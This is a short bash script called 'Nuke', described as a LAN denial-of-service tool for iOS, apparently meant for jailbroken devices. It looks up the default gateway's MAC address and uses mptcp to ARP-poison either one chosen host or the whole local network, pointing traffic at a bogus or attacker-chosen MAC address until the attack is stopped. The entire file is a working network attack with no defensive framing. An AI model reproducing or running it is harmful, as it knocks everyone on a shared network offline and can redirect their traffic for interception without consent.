#!/bin/bash
echo
echo  Nuke v0.9.7 beta
echo  Lan Denial of Service for IOS                                 
echo

trap restore INT
i=$2

# SET FUNCTIONS

function restore() {
   echo Stopping attack
   echo Restoring network, Please Wait...   
   for i in {1..100}
      do  mptcp -h $mac -H FF:FF:FF:FF:FF:FF -s $gatw >/dev/null 2>&1
   done
   rm /var/mobile/Library/Preferences/com.deneb.nuke.flagfile >/dev/null 2>&1
   echo Network Restored! Exiting now.
   exit
}

function settargmac() {
   targip=`ifconfig | grep broadcast | cut -d ' ' -f 6 | cut -d '.' -f 1,2,3`.
   targ=`arp -n $targip"$i" | cut -f4 -d' '`
   targ=`echo $targ | \
   sed "s/^\(.\):/0\1:/" | \
   sed "s/:\(.\):/:0\1:/g" | \
   sed "s/:\(.\):/:0\1:/g" | \
   sed "s/:\(.\)$/:0\1/"`
}


# CHECK PARAMETERS

#check help
if [ "$1" = -h ]
   then
      echo "Usage: nuke $m $target (if none, target entire network)"
fi

#check for single target
targ=FF:FF:FF:FF:FF:FF
if [ "$2" != "" ]
   then
      settargmac
fi

#check if needs to redirect traffic to another mac (m)
ngatw=F0:01:ED:00:B0:0B
if [ "$1" = m ]
   then
      ngatw=C8:3A:35:DB:CE:4E
fi

echo =============================================================================

#get GW ip
gatw=`netstat -rn | grep default | cut -c20-35`
echo Default Gateway: $gatw

#get GW mac
mac=`arp -n $gatw | cut -f4 -d' '`

#correct mac
mac=`echo $mac | \
sed "s/^\(.\):/0\1:/" | \
sed "s/:\(.\):/:0\1:/g" | \
sed "s/:\(.\):/:0\1:/g" | \
sed "s/:\(.\)$/:0\1/"`
echo Gateway MAC Address: $mac
echo =============================================================================
echo

if [ "$targ" = no ]
   then
      echo "$targip"$i" MAC address not found!!"
      echo
      exit
   else
   if [ "$2" = "" ]
      then
         echo Arping all the LAN...
         echo Poisoning all devices NOW!
         echo "Taking Down all the network (press Control-C to Stop)"
      else
         echo Arping $targip"$i"...
         echo Poisoning $targ NOW!
         echo
         echo "(press Control-C to Stop)"
   fi
fi

echo nukeon > /var/mobile/Library/Preferences/com.deneb.nuke.flagfile

nohup mptcp -h $ngatw -H $targ -s $gatw -F 200  >/dev/null 2>&1 &

while [ -f /var/mobile/Library/Preferences/com.deneb.nuke.flagfile ]
do
   sleep 1 
done

killall mptcp

restore
